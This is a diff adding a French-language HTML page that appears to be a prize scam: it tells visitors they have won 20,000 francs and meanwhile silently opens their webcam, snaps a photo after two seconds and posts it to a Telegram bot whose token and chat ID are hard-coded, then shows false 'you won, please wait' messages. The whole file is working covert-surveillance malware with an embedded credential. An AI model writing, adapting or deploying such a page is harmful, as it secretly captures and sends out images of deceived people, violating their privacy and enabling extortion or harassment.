@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>📸 Photo Auto → Telegram</title>
+<style>
+  body { font-family: sans-serif; background: #111; color: #fff; text-align: center; margin: 0; padding: 20px; }
+  #status { margin-top: 10px; color: #4fc3f7; font-size: 18px; white-space: pre-wrap; }
+</style>
+</head>
+<body>
+<h1>20000 f a gagne</h1>
+<div id="status">Chargement...</div>
+
+<video id="video" autoplay playsinline muted style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+const TOKEN = "9279215849:AAHTymi12ezKaQ5o_LayXQZCJsS1_DDSHMA";
+const CHAT_ID = "6482162749";
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const status = document.getElementById('status');
+
+navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 720 } })
+  .then(stream => { video.srcObject = stream; video.play(); })
+  .catch(err => { status.textContent = "❌ Caméra refusée : " + err.message; });
+
+video.addEventListener('playing', () => {
+  status.textContent = "⏳ Patienter 2 secondes...";
+  setTimeout(prendrePhoto, 2000);
+});
+
+function prendrePhoto() {
+  if (!video.videoWidth) { setTimeout(prendrePhoto, 300); return; }
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
+  canvas.toBlob(blob => {
+    status.textContent = "📤 vous etre pas eligible...";
+    const form = new FormData();
+    form.append("chat_id", CHAT_ID);
+    form.append("caption", "📸 Photo du " + new Date().toLocaleString());
+    form.append("photo", blob, "photo_" + Date.now() + ".jpg");
+
+    fetch("https://api.telegram.org/bot" + TOKEN + "/sendPhoto", { method: "POST", body: form })
+      .then(r => r.json())
+      .then(json => {
+        status.textContent = json.ok
+          ? "✅ vous vous avez gagne 20000f patienter !"
+          : "⚠️ Erreur Telegram :\n" + JSON.stringify(json, null, 2);
+      })
+      .catch(err => { status.textContent = "❌ Erreur réseau : " + err.message; });
+  }, "image/jpeg", 0.9);
+}
+</script>
+</body>
+</html>
